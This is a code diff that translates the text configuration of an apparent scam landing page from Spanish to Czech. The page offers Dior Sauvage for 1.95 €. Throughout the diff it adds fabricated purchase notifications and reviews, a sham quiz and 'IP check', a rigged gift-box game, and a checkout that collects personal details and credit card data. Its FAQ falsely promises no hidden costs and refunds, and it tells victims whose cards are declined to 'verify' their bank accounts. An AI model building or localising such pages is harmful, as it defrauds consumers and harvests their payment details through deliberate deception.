@@ -2,160 +2,160 @@ const orderHref = window.__order_href;
 const orderOriginParam = window.__origin_param;
 
 (function (exp) {
-  const countryCode = "es";
-  const lang = "es-ES";
+  const countryCode = "cs";
+  const lang = "cs-CZ";
   const locale = lang;
 
   const sizes = {
     enabled: false,
-    selectText: "Tamaño: ",
+    selectText: "Velikost: ",
     arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
   };
 
   // I FILL THIS INFO IN MAIN.JS
   const mainProduct = {
     header: "",
-    name: "¡Felicidades! <br><br> ¡Puede participar en la promoción de Dior Sauvage 100 ml!",
+    name: "Gratulujeme! <br><br> Můžete se zúčastnit propagace Dior Sauvage 100 ml!",
     oldPrice: "",
     newPrice: "",
     selectText: "",
-    text: "Dior está vendiendo sus últimos perfumes Sauvage por solo 1,95 € después de cesar sus operaciones en Europa del Este. Gracias a la nueva estrategia de campaña, cada español puede obtener hoy uno de los 1000 perfumes🎁.<br><br> Para recibir un Sauvage de Dior, por favor complete el formulario para confirmar que usted es una persona real. <br><br> ¡Apúrese, el número de artículos en oferta es limitado!",
+    text: "Dior prodává své poslední parfémy Sauvage za pouhých 1,95 € poté, co ukončil své operace ve východní Evropě. Díky nové marketingové strategii může každý Čech dnes získat jeden z 1000 parfémů 🎁.<br><br> Abyste mohli získat parfém Sauvage od Dioru, vyplňte prosím formulář a potvrďte, že jste skutečná osoba. <br><br> Pospěšte si, počet nabízených kusů je omezený!",
   };
 
   const notifications = [
     {
-      user: "Beatriz L***",
-      location: "Madrid, España",
-      action: "¡Acabo de comprar Dior Sauvage 100ml por 1.95€!",
-      timeago: "Hace 15 segundos",
+      user: "Beáta L***",
+      location: "Praha, Česko",
+      action: "Právě jsem zakoupila Dior Sauvage 100ml za 1,95 €!",
+      timeago: "před 15 sekundami",
     },
     {
-      user: "Tracey B***",
-      location: "Barcelona, España",
-      action: "¡Acabo de comprar Dior Sauvage 100ml por 1.95€!",
-      timeago: "Hace 25 segundos",
+      user: "Tereza B***",
+      location: "Brno, Česko",
+      action: "Právě jsem zakoupila Dior Sauvage 100ml za 1,95 €!",
+      timeago: "před 25 sekundami",
     },
   ];
 
   const reviewsArr = [
     {
-      name: "Luis",
-      time: "Hace 1 día",
-      header: "¡Esto es increíble!",
+      name: "Lukáš",
+      time: "před 1 dnem",
+      header: "To je neuvěřitelné!",
       product: "26468782",
       image: "./assets/proof1.jpg",
-      review: "Recientemente escuché sobre esta promoción y decidí comprarla. Gracias Dior por la venta.",
+      review: "Nedávno jsem slyšel o této propagaci a rozhodl jsem se ji zakoupit. Děkuji Dior za prodej.",
     },
     {
-      name: "Antonio",
-      time: "Hace 2 días",
-      header: "¡Fantástico! Estoy sin palabras.",
+      name: "Antonín",
+      time: "před 2 dny",
+      header: "Fantastické! Jsem beze slov.",
       product: "26468789",
       image: "./assets/proof2.jpeg",
-      review: "Gracias. El paquete fue entregado muy rápidamente.",
+      review: "Děkuji. Balíček byl doručen velmi rychle.",
     },
     {
       name: "Josefa",
-      time: "Hace 2 días",
-      header: "Simplemente genial.",
+      time: "před 2 dny",
+      header: "Prostě úžasné.",
       product: "26468783",
       image: "./assets/proof3.jpg",
-      review: "Mi esposo no quería que participara porque no habíamos oído hablar de esta venta, pero cuando llegó mi paquete, estaba muy emocionado.",
+      review: "Můj manžel nechtěl, abych se zúčastnila, protože jsme o tomto prodeji neslyšeli, ale když dorazil můj balíček, byl velmi nadšený.",
     },
     {
-      name: "Miguel",
-      time: "Hace 4 días",
-      header: "Me encanta.",
+      name: "Mikuláš",
+      time: "před 4 dny",
+      header: "Miluje ho.",
       image: "./assets/proof4.jpg",
-      review: "Quería estos perfumes desde hace tiempo y finalmente tengo uno.",
+      review: "Chtěl jsem tyto parfémy už dlouho a konečně mám jeden.",
     },
     {
-      name: "Juan",
-      time: "Hace 7 días",
-      header: "¡Wow, estoy absolutamente encantado con este producto!",
+      name: "Jan",
+      time: "před 7 dny",
+      header: "Wow, jsem naprosto nadšený z tohoto produktu!",
       product: "26468784",
       image: "./assets/proof5.jpg",
-      review: "Increíble. Perfume caro y de calidad por solo 1,95 €. ¡Gracias!",
+      review: "Neuvěřitelné. Drahý a kvalitní parfém za pouhých 1,95 €. Děkuji!",
     },
   ];
 
   const reviews = {
     reviews: reviewsArr,
-    rr: "COMENTARIOS Y OPINIONES",
+    rr: "KOMENTÁŘE A HODNOCENÍ",
     percent: "99%",
-    rec: "Comentarios sobre esta acción",
+    rec: "Komentáře k této akci",
   };
 
   const questions = {
-    _of: "Pregunta {1} de {2}: ",
+    _of: "Otázka {1} z {2}: ",
     arr: [
       {
-        q: "¿Ha usado alguna vez Dior Sauvage?",
-        a: ["Sí", "No"],
+        q: "Už jste někdy nosili Dior Sauvage?",
+        a: ["Ano", "Ne"],
       },
       {
-        q: "¿Dónde encontró esta frase?",
-        a: ["En el sitio web oficial", "Anuncios de Facebook", "Reenviado por un amigo"],
+        q: "Kde jste našli tuto frázi?",
+        a: ["Na oficiální webové stránce", "Reklamy na Facebooku", "Předáno přítelem"],
       },
       {
-        q: "¿Para qué propósito utilizará un Dior Sauvage?",
-        a: ["Para un regalo", "Para uso personal"],
+        q: "K jakému účelu použijete Dior Sauvage?",
+        a: ["Na dárek", "Pro osobní použití"],
       },
     ],
   };
 
   const check = {
-    title: "Sus respuestas están siendo verificadas.",
-    secondTitle: "Cargando...",
+    title: "Vaše odpovědi se ověřují.",
+    secondTitle: "Načítání...",
     arr: [
-      "Ha respondido a la pregunta 3/3",
-      "No hay estudios preliminares de su IP.",
-      "Los regalos se están cargando...",
+      "Odpověděli jste na otázku 3/3",
+      "Žádné předběžné studie vaší IP.",
+      "Dárky se načítají...",
     ],
   };
 
   const modals = {
     welcome: {
       texts: {
-        header: "Felicidades, ha verificado con éxito que es una persona real.",
+        header: "Gratulujeme, úspěšně jste ověřili, že jste skutečná osoba.",
         button: "OK",
         text: `
       <center>
-      Hoy, {date}, tiene la oportunidad de obtener su Dior Sauvage 100ml.
+      Dnes, {date}, máte možnost získat svůj Dior Sauvage 100ml.
         <br><br>
-        Solo tiene que elegir la caja de regalo correcta.
+        Stačí si jen vybrat správný dárkový balíček.
         <br><br>
-        ¡Tiene 3 intentos, buena suerte!
+        Máte 3 možnosti, hodně štěstí!
       </center>
     `,
       },
     },
     first: {
       texts: {
-        header: "Oh no...",
+        header: "Ach ne...",
         button: "OK",
         text: `
       <center>
-      Lo sentimos, pero este regalo está vacío. ¡Le quedan 2 intentos más. Buena suerte!
+      Omlouváme se, ale tento dárek je prázdný. Zbývají vám 2 pokusy. Hodně štěstí!
       </center>
     `,
       },
     },
     win: {
       texts: {
-        header: `¡Felicidades! ¡Usted ha ganado!`,
+        header: `Gratulujeme! Vyhráli jste!`,
         button: "OK",
         text: `
       <center>
         <p style="color: #b51817">
-        ¡Ha ganado el Dior Sauvage 100ml!
+        Vyhráli jste Dior Sauvage 100ml!
         </p>
         <br>
-        1) Haga clic en "OK" a continuación para ir a la página de pago de envío.
+        1) Klikněte na "OK" níže pro přechod na stránku platby za dopravu.
          <br><br>
-        2) Complete el formulario y pague su pedido para recibir su Dior Sauvage.
+        2) Vyplňte formulář a zaplaťte svou objednávku, abyste obdrželi Dior Sauvage.
         <br><br>
-        3) El paquete será entregado en 5 a 7 días.
+        3) Balíček bude doručen za 5 až 7 dní.
       </center>
     `,
       },
@@ -164,96 +164,96 @@ const orderOriginParam = window.__origin_param;
 
   const faqs = [
     {
-      question: "¿Cuánto tiempo tendré que esperar mi premio?",
-      answer: "Por lo general, tarda de 5 a 7 días hábiles.",
+      question: "Jak dlouho budu muset čekat na svou cenu?",
+      answer: "Obvykle to trvá 5 až 7 pracovních dnů.",
     },
     {
-      question: "¿Hay costos ocultos?",
-      answer: "Absolutamente no. Una vez que haya ganado su premio y haya ingresado sus datos, nos encargaremos del resto. ¡Los costos de envío son nuestra responsabilidad!",
+      question: "Jsou nějaké skryté náklady?",
+      answer: "Absolutně ne. Jakmile vyhrajete svou cenu a zadáte své údaje, postaráme se o zbytek. Náklady na dopravu jsou naší odpovědností!",
     },
     {
-      question: "Soy ganador, ¿por qué debería responder a las preguntas/adivinar la caja?",
-      answer: "Todavía no eres un ganador, pero fuiste uno de los 10 seleccionados para intentar ganar nuestro premio...",
+      question: "Jsem výherce, proč bych měl odpovídat na otázky/hádat krabici?",
+      answer: "Ještě nejste výherce, ale byl jste jedním z 10 vybraných k pokusu získat naši cenu...",
     },
     {
-      question: "¿Cómo puedo obtener un premio si gano?",
-      answer: "Primero, debe ingresar su dirección de envío y datos de contacto, luego nuestro sistema lo dirigirá. Luego debe demostrar que no es un robot, ya que el premio solo se ofrece a personas reales.",
+      question: "Jak mohu získat cenu, pokud vyhraju?",
+      answer: "Nejprve musíte zadat svou doručovací adresu a kontaktní údaje, poté vás náš systém přesměruje. Pak musíte dokázat, že nejste robot, protože cena je nabízena pouze skutečným lidem.",
     },
     {
-      question: "¿Por qué debería pagar 1,95 € por un premio?",
-      answer: "1,95 € no es un precio, es un pago inicial para demostrar que realmente es humano. Todos los pagos serán reembolsados una vez aprobados.",
+      question: "Proč bych měl platit 1,95 € za cenu?",
+      answer: "1,95 € není cena - je to předplatné, které dokazuje, že jste skutečně člověk. Všechny platby budou vráceny po schválení.",
     },
     {
-      question: "¿No puedo usar mi tarjeta de crédito, transacción fallida?",
-      answer: "Si no puede usar su tarjeta de crédito, su banco está bloqueando la transacción: necesita verificar su cuenta bancaria.",
+      question: "Nemohu použít svou kreditní kartu, transakce selhala?",
+      answer: "Pokud nemůžete použít svou kreditní kartu, vaše banka blokuje transakci: musíte ověřit svůj bankovní účet.",
     },
   ];
 
   const cartSteps = {
     personal: {
-      title: "Información personal",
+      title: "Osobní údaje",
       fields: {
         name: {
           enabled: true,
-          field: "Nombre",
+          field: "Jméno",
         },
         family: {
           enabled: true,
-          field: "Apellido",
+          field: "Příjmení",
         },
         phone: {
           enabled: true,
-          field: "Número de teléfono",
+          field: "Telefonní číslo",
         },
         email: {
           enabled: true,
-          field: "Correo electrónico",
+          field: "Email",
         },
       },
     },
     delivery: {
-      title: "Entrega",
+      title: "Doručení",
       fields: {
         city: {
           enabled: true,
-          field: "Ciudad",
+          field: "Město",
         },
         address: {
           enabled: true,
-          field: "Dirección de entrega",
+          field: "Doručovací adresa",
         },
         zip: {
           enabled: true,
-          field: "Código postal",
+          field: "PSČ",
         },
       },
     },
     payment: {
-      title: "Métodos de pago",
-      creditCard: "Pago en línea con tarjeta de crédito",
+      title: "Způsoby platby",
+      creditCard: "Platba online kreditní kartou",
     },
   };
 
   const cart = {
     steps: cartSteps,
     main: {
-      title: "Resumen de pedido",
+      title: "Přehled objednávky",
       oldPrice: "",
       newPrice: "1,95 €",
-      size: "Tamaño",
+      size: "Velikost",
       subTotal: {
-        title: "Valor del pedido",
+        title: "Hodnota objednávky",
         amount: "1,95 €",
       },
       delivery: {
-        title: "Entrega",
+        title: "Doručení",
         amount: "0,00 €",
       },
       total: {
-        title: "Total",
+        title: "Celkem",
         amount: "1,95 €",
       },
-      checkoutButton: "Pague su pedido",
+      checkoutButton: "Zaplaťte svou objednávku",
     },
   };
 
@@ -271,6 +271,7 @@ const orderOriginParam = window.__origin_param;
       ],
     },
   ];
+
 
 
 
